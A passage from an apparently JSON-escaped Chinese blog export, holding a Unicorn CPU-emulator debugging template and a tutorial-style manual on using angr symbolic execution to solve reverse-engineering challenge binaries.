mips_const.UC_MIPS_REG_V1: \"V1\",\n    mips_const.UC_MIPS_REG_AT: \"AT\",\n    mips_const.UC_MIPS_REG_A0: \"A0\",\n    mips_const.UC_MIPS_REG_A1: \"A1\",\n    mips_const.UC_MIPS_REG_A2: \"A2\",\n    mips_const.UC_MIPS_REG_A3: \"A3\",\n    mips_const.UC_MIPS_REG_T0: \"T0\",\n    mips_const.UC_MIPS_REG_T1: \"T1\",\n    mips_const.UC_MIPS_REG_T2: \"T2\",\n    mips_const.UC_MIPS_REG_T3: \"T3\",\n    mips_const.UC_MIPS_REG_T4: \"T4\",\n    mips_const.UC_MIPS_REG_T5: \"T5\",\n    mips_const.UC_MIPS_REG_T6: \"T6\",\n    mips_const.UC_MIPS_REG_T7: \"T7\",\n    mips_const.UC_MIPS_REG_S0: \"S0\",\n    mips_const.UC_MIPS_REG_S1: \"S1\",\n    mips_const.UC_MIPS_REG_S2: \"S2\",\n    mips_const.UC_MIPS_REG_S3: \"S3\",\n    mips_const.UC_MIPS_REG_S4: \"S4\",\n    mips_const.UC_MIPS_REG_S5: \"S5\",\n    mips_const.UC_MIPS_REG_S6: \"S6\",\n    mips_const.UC_MIPS_REG_S7: \"S7\",\n    mips_const.UC_MIPS_REG_T8: \"T8\",\n    mips_const.UC_MIPS_REG_T9: \"T9\",\n    mips_const.UC_MIPS_REG_GP: \"GP\",\n    mips_const.UC_MIPS_REG_SP: \"SP\",\n    mips_const.UC_MIPS_REG_FP: \"FP\",\n    mips_const.UC_MIPS_REG_RA: \"RA\",\n             }\n\n\nREG_TABLE = {UC_ARCH_ARM: REG_ARM, UC_ARCH_X86: REG_AMD64,UC_ARCH_MIPS: REG_MIPS,UC_ARCH_ARM64:REG_ARM64}\n```\n\n### 使用方法：\n\n```python\nTHUMB = asm('''\n    mov rax,0x10\n    mov rdx,0x20\n    ''')\nADDRESS = 0x10000\n#注意大端序的话需要加上设置成UC_MODE_64+UC_MODE_BIG_ENDIAN\nmu = Uc(UC_ARCH_X86, UC_MODE_64)\nmu.mem_map(ADDRESS, 2 * 0x10000)\nmu.mem_write(ADDRESS, THUMB)\n\n#debugger attach\n#需要注意的是，这个需要放在hook函数之前才行，不然可能出现一些意想不到的错误\nudbg = UnicornDebugger(mu)\nudbg.add_bpt(ADDRESS)\n\n# emulate machine code in infinite time\nmu.emu_start(ADDRESS, ADDRESS + len(THUMB))\n```\n\n调试起来之后，输入help获取相关的命令信息\n\n![image-20220221185425958](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202211854104.png)\n\n### 添加命令：\n\n其实[无名侠师傅](https://bbs.pediy.com/user-617255.htm)的模板已经写得挺好了，我们只要往上加就行了，主要还是设置`UnicornDebugger`这个类，在中断处理这里添加命令\n\n![image-20220221185630168](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202211856245.png)\n\n\n\n## 4.模板\n\n我们用unicorn还是使用模板来进行调试更好，这样能加快分析的速度，这里就给出自己的一个常用模板\n\n```python\n# -*- coding:UTF-8 -*-\nfrom __future__ import print_function\nfrom pwn import*\nfrom unicorn import *\nfrom unicorn.x86_const import *\nfrom unicornDbg import uniDbg\nimport ipdb\n\ncontext.arch = 'amd64'\n\ndef hook_OneStep(uc, address, size, user_data):\n    #print(\">>> Tracing instruction at 0x%x, instruction size = 0x%x\" % (address, size))\n    # 利用ret来跳过printf函数，类似还可以跳过其他函数\n    if address == 0x640:  # printf\n        rsp = uc.reg_read(UC_X86_REG_RSP)\n        retn_addr = u64(uc.mem_read(rsp, 8))\n        uc.reg_write(UC_X86_REG_RIP, retn_addr)\n    # 跳过某条指令，这里跳过mov rax,1指令\n    CODE = uc.mem_read(address,7)\n    if CODE == asm('''mov rax,1'''):\n    #if CODE == b\"\\xb9\\x00\\x00\\x00\\x00\":\n        uc.reg_write(UC_X86_REG_RIP,address + 7)\n\n\ndef hook_code(mu, address, size, user_data):\n    print('>>> Tracing instruction at 0x%x, instruction size = 0x%x' %(address, size))\n\n\ndef initReg(uc, STACK_ADDRESS=0x7F00000000, RAX=0, RBX=0,\n            RCX=0, RDX=0, RSI=0,\n            RDI=0, R8=0, R9=0,\n            R10=0, R11=0, R12=0,\n            R13=0, R14=0, R15=0):\n    uc.reg_write(UC_X86_REG_RAX, RAX)\n    uc.reg_write(UC_X86_REG_RBX, RBX)\n    uc.reg_write(UC_X86_REG_RCX, RCX)\n    uc.reg_write(UC_X86_REG_RDX, RDX)\n    uc.reg_write(UC_X86_REG_RSI, RSI)\n    uc.reg_write(UC_X86_REG_RDI, RDI)\n    uc.reg_write(UC_X86_REG_R8, R8)\n    uc.reg_write(UC_X86_REG_R9, R9)\n    uc.reg_write(UC_X86_REG_R10, R10)\n    uc.reg_write(UC_X86_REG_R11, R11)\n    uc.reg_write(UC_X86_REG_R12, R12)\n    uc.reg_write(UC_X86_REG_R13, R13)\n    uc.reg_write(UC_X86_REG_R14, R14)\n    uc.reg_write(UC_X86_REG_R15, R15)\n    uc.reg_write(UC_X86_REG_RSP, STACK_ADDRESS + 0x100)\n    uc.reg_write(UC_X86_REG_RBP, STACK_ADDRESS + 0x200)\n\n\ndef initUC(uc, CODE_DATA,CODE_ADDRESS=0x40000,CODE_SIZE=2 * 1024 * 1024,\n           STACK_ADDRESS=0x7F00000000, STACK_SIZE=2 * 1024 * 1024):\n    # 获取一块内存用来保存程序的所有数据\n    uc.mem_map(CODE_ADDRESS, CODE_SIZE, UC_PROT_ALL)\n    uc.mem_map(STACK_ADDRESS, STACK_SIZE, UC_PROT_ALL)\n    uc.mem_write(CODE_ADDRESS, CODE_DATA)\n\n\n\n#\".text\"/\".bss\"/\".got.plt\" 即各段名称\ndef getCODEFromBinary(binary,start = None,count=0x100):\n    elf = ELF(binary, checksec=False)\n    if(start == None):\n        with open(binary, \"rb\") as f:\n            CODE_DATA = f.read()\n        return CODE_DATA\n    elif( isinstance(start,str)):\n        start_addr = elf.get_section_by_name(start).header.sh_addr\n        count = elf.get_section_by_name(start).header.sh_size\n    else:\n        start_addr = start\n    CODE_DATA = elf.read(start_addr,count)\n    return CODE_DATA\n\n\n\nif __name__ == '__main__':\n    print(\"Emulate amd64 code\")\n    uc = Uc(UC_ARCH_X86, UC_MODE_64)\n    binary = \"/home/hacker/Desktop/test/note/note\"\n\n    CODE_ADDRESS = 0x400000\n    START_ADDRESS = CODE_ADDRESS + 0x0\n\n    CODE_DATA = asm('''\n    mov rax,1\n    mov rdx,1\n    mov rcx,1\n    ''')\n    #CODE_DATA = getCODEFromBinary(binary,\".text\")\n\n    # 初始化UC\n    initUC(uc, CODE_DATA,CODE_ADDRESS)\n    initReg(uc, RSI=0x20, RCX=0x40)\n\n    #需要放在hook函数之前\n    udbg = uniDbg.UnicornDebugger(uc)\n    udbg.add_bpt(START_ADDRESS)\n\n    # 添加hook_OneStep函数，使得CODE_ADDRESS~CODE_ADDRESS+len(CODE_DATA)中每条指令执行时\n    # 都调用该hook_OneStep函数\n    uc.hook_add(UC_HOOK_CODE, hook_OneStep, None, START_ADDRESS,START_ADDRESS+len(CODE_DATA))\n\n    try:\n        # 运行一段代码\n        uc.emu_start(START_ADDRESS, START_ADDRESS + 0x30)\n    except UcError as e:\n        print(\"ERROR: %s\" % e)\n```\n","tags":["Unicorn"],"categories":["Reverse","Unicorn"]},{"title":"Angr手册","url":"/2021/11/19/Angr手册/","content":"\n# 一、初始化\n\n## ▲简单使用\n\n```python\n\nimport angr\np=angr.Project(\"./signal.exe\")         #加载文件\nstate=p.factory.entry_state()          #创造状态state， entry_state构造一个从函数入口点执行的状态\nsm=p.factory.simgr(state)              #模拟管理器\ngood=0x4017A5                          #想要的地址\nfail=0x4017A5\nsm.explore(find=good,avoid=fail)\nif sm.found:                           #如果found分类不为空\n    find_state=sm.found[0]             #found里的状态给find_state\n    print(find_state.posix.dumps(0))    #获取输入\n```\n\n\n\n## ▲模板\n\n```python\nimport angr\nimport sys\nimport claripy\n\nfilePath = \"/home/hacker/Desktop/Reverse/Angr/AngrCTF_FITM/\"\n\n\ndef Go():\n    path_to_binary = filePath + \"./14_angr_shared_library/lib14_angr_shared_library.so\"\n\n    base = 0x4000000\n    project = angr.Project(path_to_binary, load_options={\n        'main_opts' : {'custom_base_addr' : base}\n    })\n    \n    buffer_pointer = claripy.BVV(0x3000000, 32)\n    \n    validate_function_address = base + 0x6d7\n    initial_state = project.factory.call_state(validate_function_address, buffer_pointer, claripy.BVV(8, 32))\n    \n    password = claripy.BVS('password', 8*8)\n    initial_state.memory.store(buffer_pointer, password)\n    \n    simulation = project.factory.simgr(initial_state)\n    \n    success_address = base + 0x783\n    simulation.explore(find=success_address)\n    \n    if simulation.found:\n        for i in simulation.found:\n            solution_state = i\n            solution_state.add_constraints(solution_state.regs.eax != 0)\n            solution = solution_state.solver.eval(password,cast_to=bytes)\n            print(\"[+] Success! Solution is: {0}\".format(solution))\n            #print(scanf0_solution, scanf1_solution)\n    else:\n        raise Exception('Could not find the solution')\n\nif __name__ == \"__main__\":\n    Go()\n```\n\n\n\n\n\n## 1.创建Project\n\n```python\npath_to_binary = filePath + \"00_angr_find/00_angr_find\"\nproject = angr.Project(path_to_binary, auto_load_libs=False)\ninitial_state = project.factory.entry_state()\n#initial_state = project.factory.blank_state(addr=start_address)\nsimulation = project.factory.simgr(initial_state)\n```\n\n`auto_load_libs`：表是否载入依赖库的函数，libc等，如果不载入，返回的值是不可约束的，但是载入可能会路径爆炸。\n\n`initial_state`：告诉angr从入口处开始，或者从指定的地址`start_address`开始，不过这样一般需要设置一下寄存器。\n\n`simulation`：获取我们操作的对象，之后的操作即对这个对象进行操作。\n\n\n\n## 2.设置探索路径\n\n### (1)设置约束路径\n\n#### ①通过地址设置\n\n```python\nprint_good_address = 0x8048678\navoid_me_address = 0x080485A8\n```\n\n表如果程序到达`print_good_address`，即代表成功解题，一般题中就是输出flag的地址。\n\n`avoid_me_address`则用在需要避免到达的地方\n\n#### ②通过打印内容设置\n\n```python\ndef is_successful(state):\n    stdout_output = state.posix.dumps(sys.stdout.fileno())\n    if b'Good Job.' in stdout_output:\n        return True\n    else: \n        return False\n    \ndef should_abort(state):\n    stdout_output = state.posix.dumps(sys.stdout.fileno())\n    if b'Try again.' in  stdout_output:\n        return True\n    else: \n        return False    \n```\n\n当程序中有多个正确输出的时候，获取程序输出，如果输出中包含标志性的符号`Good Job`，则代表成功到达，或者设置其他的标志性符号。或者当程序中有多个相同的错误输出的时候，获取程序输出，如果输出中包含标志性的符号`Try Again`，则代表应该需要避免的地方，而不用输入多个地址。\n\n#### ③设置向量\n\n一般而言，可能输入的长度或者字符有些限制，比如scanf的格式化获取输入，这时候我们就可以通过向量生成限制性的输入字符，缩小搜索路径\n\n```python\nimport claripy\npasswd_size_in_bits = 32\npasswd0 = claripy.BVS('passwd0', passwd_size_in_bits)\npasswd1 = claripy.BVS('passwd1', passwd_size_in_bits)\npasswd2 = claripy.BVS('passwd2', passwd_size_in_bits)\n```\n\n设置了三个向量，长度为32bit\n\n`BVS()`：代表位向量创建\n\n`FPS()`：代表符号向量创建\n\n#### ④设置寄存器\n\n当程序有时候不需要从头开始，而是只测试某个地方或者在某个地方需要更改寄存器时，可以进行设置\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\ninitial_state.regs.eax = passwd0\ninitial_state.regs.ebx = passwd1\ninitial_state.regs.edx = passwd2\n```\n\n#### ⑤设置栈上的数据\n\n##### A.先设置栈帧指针\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\ninitial_state.regs.ebp = initial_state.regs.esp *#EBP=ESP*\n```\n\n##### B.观察栈上数据，然后进行设置\n\n比如如下情形，需要0x8的栈空间\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129153552.png)\n\n那么先将esp放到ebp-0x8的位置\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\npadding_length_in_bytes = 0x08\ninitial_state.regs.esp -= padding_length_in_bytes\n```\n\n然后设置向量，压入栈中\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\npasswd0 = claripy.BVS('var_10', 32) #s1\npasswd1 = claripy.BVS('var_C', 32) #s2\n#var_10只代表name\n\ninitial_state.stack_push(passwd0) \ninitial_state.stack_push(passwd1)\n```\n\n这样即可完成栈中数据的布置\n\n##### 🔺注：\n\n这里符号化栈上数据时，只能一个一个push，即32位一次push进4字节，64位一次push进8字节，不能多，不然会造成符号截断。这里其实可以直接通过获取rsp，然后利用rsp来加载数据即可。\n\n```python\ninitial_state.regs.rsp = initial_state.regs.rbp\nbuf_addr = initial_state.regs.rsp - 0x10\npasswd0 = claripy.BVS('password', 0x8 * 8)\ninitial_state.memory.store(buf_addr, passwd0)\n```\n\n\n\n#### ⑥符号化内存\n\n寻址需要符号化的内存地址，如下：\n\n![image-20211129163056788](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129163056.png)\n\n即符号化四个八字节长度的user_input\n\n```python\npasswd_size_in_bits = 64\npasswd0 = claripy.BVS('passwd0', passwd_size_in_bits)\npasswd1 = claripy.BVS('passwd1', passwd_size_in_bits)\npasswd2 = claripy.BVS('passwd2', passwd_size_in_bits)\npasswd3 = claripy.BVS('passwd3', passwd_size_in_bits)\n\n#initial_state = project.factory.blank_state(addr=start_address)\npasswd0_address = 0xA1BA1C0\n#passwd1_address = 0xA1BA1C8\n#passwd2_address = 0xA1BA1D0\n#passwd3_address = 0xA1BA1D8\ninitial_state.memory.store(passwd0_address, passwd0)\ninitial_state.memory.store(passwd0_address + 0x8,  passwd1)\ninitial_state.memory.store(passwd0_address + 0x10, passwd2)\ninitial_state.memory.store(passwd0_address + 0x18, passwd3)\n```\n\n#### ⑦符号化堆内存\n\n即在buffer0和buffer1中保存的是malloc出来的内存指针\n\n\n\n![image-20211129164136483](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129164136.png)\n\n![image-20211129164213775](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129164213.png)\n\n这样我们就可以向这两个buf中写入内存地址，然后把需要符号化的内存写入到对应的内存地址中，这里选取的内存地址设置为\n\n```python\nfake_heap_address0 = 0xffffc93c\nfake_heap_address1 = 0xffffc94c\n```\n\n最终如下设置\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\nfake_heap_address0 = 0xffffc93c\npointer_to_malloc_memory_address0 = 0xabcc8a4\nfake_heap_address1 = 0xffffc94c\npointer_to_malloc_memory_address1 = 0xabcc8ac\ninitial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness)\ninitial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness)\n\ninitial_state.memory.store(fake_heap_address0, passwd0)  \ninitial_state.memory.store(fake_heap_address1, passwd1)\n```\n\n#### ⑧符号化文件\n\n```python\nfilename = 'OJKSQYDP.txt'\n#64个字节\nsymbolic_file_size_bytes = 64\n#创建文件向量\npasswd0 = claripy.BVS('password', symbolic_file_size_bytes * 8)\npasswd_file = angr.storage.SimFile(filename, content=passwd0, size=symbolic_file_size_bytes)\n\n\n#initial_state = project.factory.blank_state(addr=start_address)\n#将文件向量插入\ninitial_state.fs.insert(filename, passwd_file)\n```\n\n\n\n\n\n\n\n## 3.约束比较函数\n\n当在循环里进行比较判断是，会产生很多分支\n\n```c\n_BOOL4 __cdecl check(int a1, unsigned int a2)\n{\n  int v3; // [esp+8h] [ebp-8h]\n  unsigned int i; // [esp+Ch] [ebp-4h]\n  v3 = 0;\n  for ( i = 0; i < a2; ++i )\n  {\n    if ( *(_BYTE *)(i + a1) == *(_BYTE *)(i + 0x804A040) )\n      ++v3;\n  }\n  return v3 == a2;\n}\n```\n\n这里的a2=16，即将16个字符都拿出来逐个比较，每次比较产生两个分支，16次比较就会产生2^16=65536个分支，会使得分支变得很大，但是这里其实只是一个比较函数，保证a1代表字符串的内容和`0x804A040`中保存的字符串内容相等就可以了，这里就可以运行到该函数之前，然后自己获取对应内存中值进行比较，添加限制即可。\n\n```python\n#initial_state = project.factory.blank_state(addr=start_address)\n\n#buff_addr中保存的即为我们运行到比较函数之前得到的字符串，使之与0x804A040中的字符串进行比较\nbuff_addr = 0x0804A050\naddress_to_check_constraint = 0x08048565\nsimulation = project.factory.simgr(initial_state)\n#探索路径到进入比较函数之前\nsimulation.explore(find=address_to_check_constraint)\nif simulation.found:\n    solution_state = simulation.found[0]\n    constrained_parameter_address = buff_addr\n    constrained_parameter_size_bytes = 16\n    constrained_parameter_bitvector = solution_state.memory.load(constrained_parameter_address,constrained_parameter_size_bytes)\n\n\n#0x804A040中保存的即为\"AUPDNNPROEZRJWKB\"\nconstrained_parameter_desired_value = 'AUPDNNPROEZRJWKB'\n\n#比较约束，获得使两值相等的符号量\nsolution_state.solver.add(constrained_parameter_bitvector == constrained_parameter_desired_value)\n\n#得到最终解\nsolution0 = solution_state.solver.eval(passwd0,cast_to=bytes)\n```\n\n\n\n## 4.使用HOOK函数\n\n### (1)利用地址进行hook\n\n即用自己编写的函数替代程序中的函数来执行，假设这里想hook掉以下函数，该函数即为之前的比较函数check\n\n![image-20211129172222733](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129172222.png)\n\n那么看字节码可知对应的函数为5个字节，地址为`0x80486B3`\n\n```python\ncheck_equals_called_address = 0x80486B3\ninstruction_to_skip_length = 5\n\n#以下是一个整体\n#利用hook函数进行替换\n@project.hook(check_equals_called_address, length=instruction_to_skip_length)\ndef skip_check_equals_(state):\n    #函数的输入参数\n    user_input_buffer_address = 0x804A054\n    user_input_buffer_length = 16\n    user_input_string = state.memory.load(\n        user_input_buffer_address,\n        user_input_buffer_length,\n        endness=archinfo.Endness.LE\n    )\n    #一般都是小端，大端:BE\n\n    #需要比较的字符串\n    check_against_string = 'XKSPZSJKJYQCQXZV'\n\n    #设置返回的寄存器，只返回给了eax寄存器，所以只需要设置eax寄存器\n    register_size_bit = 32\n    state.regs.eax = claripy.If(\n        user_input_string == check_against_string,\n        claripy.BVV(1, register_size_bit),\n        claripy.BVV(0, register_size_bit)\n    )\n```\n\n### (2)利用函数名进行hook\n\n当函数被调用了多次，而我们又需要对每一个这个函数进行hook时，就可以通过函数名进行hook\n\n```c\n_BOOL4 __cdecl check_equals_ORSDDWXHZURJRBDH(char *to_check, unsigned int length)\n{\n  int v3; // [esp+8h] [ebp-8h]\n  unsigned int i; // [esp+Ch] [ebp-4h]\n\n  v3 = 0;\n  for ( i = 0; i < length; ++i )\n  {\n    if ( to_check[i] == *(_BYTE *)(i + 0x804C048) )\n      ++v3;\n  }\n  return v3 == length;\n}\n```\n\n比如替换上述的函数\n\n```python\nclass ReplacementCheckEquals(angr.SimProcedure):\n    def run(self, to_check, length):\n        #第一个参数\n        user_input_buffer_address = to_check\n        #第二个参数\n        user_input_buffer_length = length\n        \n        #依据参数获取输入的字符串\n        user_input_string = self.state.memory.load(\n            user_input_buffer_address,\n            user_input_buffer_length)\n        \n        #执行比较功能并返回\n        check_against_string = 'ORSDDWXHZURJRBDH'\n        return claripy.If(\n            user_input_string == check_against_string,\n            claripy.BVV(1, 32),\n            claripy.BVV(0, 32))\n\ncheck_equals_symbol = 'check_equals_ORSDDWXHZURJRBDH'\nproject.hook_symbol(check_equals_symbol, ReplacementCheckEquals())\n```\n\n主要就是定义一个类，将所有函数名称为check_equals_ORSDDWXHZURJRBDH的函数用类ReplacementCheckEquals中的run函数替换\n\n### (3)Hook掉Scanf函数\n\n```python\nclass ReplacementScanf(angr.SimProcedure):\n    def run(self, format_string, param0, param1):\n        \n        #设置要存入对应参数内存中的数据\n        scanf0 = claripy.BVS('scanf0', 32)\n        scanf1 = claripy.BVS('scanf1', 32)\n\n        #获取需要存入的内存地址，然后以符号向量的形式存储进去\n        scanf0_address = param0\n        self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)\n        scanf1_address = param1\n        self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)\n\n        #将两个向量数据设置为全局的，方便之后求解打印\n        self.state.globals['solutions'] = (scanf0, scanf1)\nscanf_symbol = '__isoc99_scanf'\n\nproject.hook_symbol(scanf_symbol, ReplacementScanf())\n```\n\n### (4)Hook静态库函数\n\n当程序使用静态编译时，可能需要Hook一些静态库函数\n\n在探索开始之前添加即可\n\n```python\nproject.hook(0x804ed40, angr.SIM_PROCEDURES['libc']['printf']())\nproject.hook(0x804ed80, angr.SIM_PROCEDURES['libc']['scanf']())\nproject.hook(0x804f350, angr.SIM_PROCEDURES['libc']['puts']())\nproject.hook(0x8048d10, angr.SIM_PROCEDURES['glibc']['__libc_start_main']())\n```\n\n### (5)处理函数在外部库so中\n\n当程序对于flag的加解密处理函数在外部库中时，这时候可以直接调用外部库中的函数进行符号执行\n\n```python\n#因为库函数动态加载，所以需要指定偏移\nbase = 0x4000000\nproject = angr.Project(path_to_binary, load_options={\n    'main_opts' : {'custom_base_addr' : base}\n})\n\n#为输入参数创建内存向量的地址\nbuffer_pointer = claripy.BVV(0x3000000, 32)\n\n#设置需要调用的函数地址\nvalidate_function_address = base + 0x6d7\n#设置状态，调用函数\ninitial_state = project.factory.call_state(validate_function_address, buffer_pointer, claripy.BVV(8, 32))\n\n#装载内存向量进入地址指针中\npassword = claripy.BVS('password', 8*8)\ninitial_state.memory.store(buffer_pointer, password)\n```\n\n`main_opts`为主程序指定加载参数，常用以下参数\n\n- custom_base_addr —— 使用的基地址\n- custom_entry_point —— 使用的入口点\n- custom_arch —— 使用的处理器体系结构的名字\n\n这样在之后的设置成功地址也需要用到`base`\n\n```python\nsuccess_address = base + 0x783\n```\n\n### (6)快速hook\n\n```python\ndef hook_Normal(state):\n    state.regs.rax = 8\np.hook(0x40168e, hook_Normal, length=5)\n\n#或者\np.hook_symbol('ptrace', angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'](return_value=0))\n\n#直接pass\ndef patch_0(state):\n    pass\n```\n\n\n\n## 5.开始探索\n\n```python\nsimulation.explore(find=is_successful, avoid=should_abort)\n```\n\n`simulation.explore`表开始探索，试图进入到`print_good_address`中\n\n\n\n### ▲veritesting模式\n\n该模式可以对路径爆炸进行一些解决\n\nhttps://www.anquanke.com/post/id/251984\n\n但是在需要探索所有路径的时候，veritesting会出错，将一些路径合并，从而无法抵达正确的deadend路径，详见`csaw_wyvern/wyvern`\n\n```python\nsimulation = project.factory.simgr(initial_state, veritesting=True)\n```\n\n\n\n## 6.输出答案\n\n### (1)符号输出\n\n```python\nif simulation.found:\n    solution_state = simulation.found[0]\n    solution = solution_state.posix.dumps(sys.stdin.fileno())\n    print(\"[+] Success! Solution is: {}\".format(solution.decode(\"utf-8\")))\nelse:\n    raise Exception('Could not find the solution')\n```\n\n即获取找到的第一串符号，然后输出\n\n### (2)位向量输出\n\n这个一般在最开始使用位向量BVS创建输入的时候使用\n\n```python\n#passwd0 = claripy.BVS('passwd0', passwd_size_in_bits)\n#passwd1 = claripy.BVS('passwd1', passwd_size_in_bits)\n#passwd2 = claripy.BVS('passwd2', passwd_size_in_bits)\nif simulation.found:\n    for solution_state in simulation.found:\n        solution0 = format(solution_state.solver.eval(passwd0), 'x')\n        solution1 = format(solution_state.solver.eval(passwd1), 'x')\n        solution2 = format(solution_state.solver.eval(passwd2), 'x')\n        solution = solution0 + \" \" + solution1 + \" \" + solution2\n        print(\"[+] Success! Solution is: {}\".format(solution))\n        # print(simgr.found[0].posix.dumps(0))\nelse:\n    raise Exception('Could not find the solution')\n```\n\n输出的是十六进制的数字\n\n### (3)求解选项\n\n| 接口                               | 描述                                                     |\n| ---------------------------------- | -------------------------------------------------------- |\n| `solver.eval(expression)`          | 将会解出一个可行解                                       |\n| `solver.eval_one(expression)`      | 将会给出一个表达式的可行解，若有多个可行解，则抛出异常   |\n| `solver.eval_upto(expression, n)`  | 将会给出最多n个可行解，如果不足n个就给出所有的可行解。   |\n| `solver.eval_exact(expression, n)` | 将会给出n个可行解，如果解的个数不等于n个，将会抛出异常。 |\n| `solver.min(expression)`           | 给出最小可行解                                           |\n| `solver.max(expression)`           | 给出最大可行解                                           |\n\n\n\n\n\n# 二、进阶管理\n\nStash:  active 、deadend 、found等\n\n## 1.运行方式\n\n基本块的区分通常以`call`，`cmp-jz/jmp...`，`ret`等为标志。\n\n### (1)step()\n\n每次向前运行一个基本块，并返回进行分类\n\n让 stash 中的所有状态都执行一个基本块，默认的 stash 为 active\n\n### (2)run()\n\n每次向前运行一个基本块，并返回进行分类\n\n### (3)explore()\n\n根据`find`和`avoid`进行基本块的执行，最后会返回`found`和`avoid`状态\n\n\n\n## 2.跨平台使用\n\n### (1)ARM\n\n直接对应使用，不用添加其他的什么配置\n\n```python\nstate.regs.r0 = concrete_addr\n```\n\n## 3.直接使用二进制里的函数\n\n文件在\"/home/hacker/Desktop/Reverse/Angr/myTest/callBinaryFunc\"\n\n```python\n#myFunc函数的地址，即函数最开始的汇编代码的地址\nmyFunc_addr = base + 0x64A\nproject = angr.Project(path_to_binary, auto_load_libs=True)\n\n#(SimTypeInt(False)表设置参数，传参和返回值的类型设置\nprototype = SimTypeFunction((SimTypeInt(False),SimTypeInt(False)),SimTypeInt(False))\n\nmyFunc = project.factory.callable(myFunc_addr, cc=project.factory.cc(func_ty=prototype), toc=None, concrete_only=True)\n\n#调用函数\nmyFunc.perform_call(0,0x100)\n\n#获取最终的状态state,即可从该state中获取返回值和各种寄存器状态\nstate = myFunc.result_state\nprint(state.regs.rax)\n```\n\n或者如下：\n\n```\nfunc = project.factory.callable(project.loader.find_symbol('myFunc).rebased_addr)\n```\n\n\n\n## 4.C++库的实现\n\n只能从最开始进行\n\n由于`angr`是只实现了C库，为了深入C++标准库中，我们需要在设置state时需要使用`full_init_state`方法，并且设置`unicorn`引擎\n\nunicorn引擎可能可以加快运行速度，有时候也会放慢速度，就比如在只有一条路径，但是需要添加flag约束的：`asisctffinals2015_fake`\n\n```python\ninitial_state = project.factory.full_init_state(\n    args=path_to_binary,\n    add_options=angr.options.unicorn,\n    stdin=flag,\n)\n```\n\n### ▲注：\n\n这种从最开始执行的方法通常用在路径分支不多的时候，如果比较多就容易路径爆炸。\n\n\n\n## 5.loader 加载模块\n\n将二进制文件加载到虚拟的地址空间\n\n### (1)加载二进制选项\n\n在加载二进制文件时可以设置特定的参数，使用 `main_opts` 和 `lib_opts` 参数进行设置。\n\n- `backend` - 指定 backend\n- `base_addr` - 指定基址\n- `entry_point` - 指定入口点\n- `arch` - 指定架构\n\n```python\n>>> angr.Project('examples/fauxware/fauxware', main_opts={'backend': 'blob', 'arch': 'i386'}, lib_opts={'libc.so.6': {'backend': 'elf'}})\n<Project examples/fauxware/fauxware>\n```\n\n\n\n### (2)获取加载对象的信息\n\n```python\nobj = proj.loader.main_object\nobj = proj.loader.all_objects\nobj.sections\nobj.plt\nobj.linked_base\nobj.mapped_base\nobj.max_addr\n```\n\n\n\n### (3)符号和重定位信息\n\n#### ①符号对象信息\n\n```python\nmalloc = proj.loader.find_symbol('malloc')\nmalloc = proj.loader.main_object.get_symbol('malloc')\n#之后可以使用malloc这个对象\n>>> malloc.\nmalloc.is_common           malloc.is_local            malloc.owner_obj           malloc.resolvedby\nmalloc.is_export           malloc.is_static           malloc.rebased_addr        malloc.size\nmalloc.is_extern           malloc.is_weak             malloc.relative_addr       malloc.subtype\nmalloc.is_forward          malloc.linked_addr         malloc.resolve(            malloc.type\nmalloc.is_function         malloc.name                malloc.resolve_forwarder(  \nmalloc.is_import           malloc.owner               malloc.resolved\n    \n#获取符号对象地址\n>>> malloc.rebased_addr\n0x10002c0\n>>> malloc.linked_addr \n0x2c0     \n>>> malloc.relative_addr\n0x2c0\n```\n\n#### ②共享库信息\n\n选项\n\n| `auto_load_libs`      | 是否自动加载程序的依赖       |\n| --------------------- | ---------------------------- |\n| `skip_libs`           | 避免加载的库                 |\n| `except_missing_libs` | 无法解析共享库时是否抛出异常 |\n| `force_load_libs`     | 强制加载的库                 |\n| `ld_path`             | 共享库的优先搜索搜寻路径     |\n\n信息\n\n```python\n>>> proj = angr.Project('/bin/true')\n>>> proj.loader.shared_objects\nOrderedDict([('true', <ELF Object true, maps [0x400000:0x60721f]>), ('libc.so.6', <ELF Object libc-2.27.so, maps [0x1000000:0x13f0adf]>), ('ld-linux-x86-64.so.2', <ELF Object ld-2.27.so, maps [0x2000000:0x222916f]>)])\n>>> proj = angr.Project('/bin/true', load_options={\"auto_load_libs\": False})\n>>> proj.loader.shared_objects\nOrderedDict([('true', <ELF Object true, maps [0x400000:0x60721f]>)])\n```\n\n#### ③Libc函数信息\n\n```python\n>>> angr.procedures.libc.malloc\n<module 'angr.procedures.libc.malloc' from '/home/angr/angr-dev/angr/angr/procedures/libc/malloc.py'>\n>>> angr.SIM_PROCEDURES['libc']['malloc']\n<class 'angr.procedures.libc.malloc.malloc'>\n```\n\n## 6.Hook信息\n\n查看hook相关的信息\n\n```python\n>>> stub_func = angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'] # this is a CLASS\n>>> proj.hook(0x10000, stub_func())  # hook with an instance of the class\n>>> proj.is_hooked(0x10000)            # these functions should be pretty self-explanitory\nTrue\n>>> proj.hooked_by(0x10000)\n<ReturnUnconstrained>\n>>> proj.unhook(0x10000)\n>>> @proj.hook(0x20000, length=5)\n... def my_hook(state):\n...     state.regs.rax = 1\n>>> proj.is_hooked(0x20000)\nTrue\n```\n\n\n\n\n\n# 三、命令行使用angr\n\n## 1.docker环境\n\n```python\nsudo docker run -it --rm -v $PWD/myTest:/myTest angr/angr\n```\n\n## 2.前期准备\n\n### (1)进入angr\n\n```python\nimport angr\nimport logging\nproject = angr.Project(\"/myTest/callBinaryFunc\")\n#使用unicorn引擎\ninitial_state = 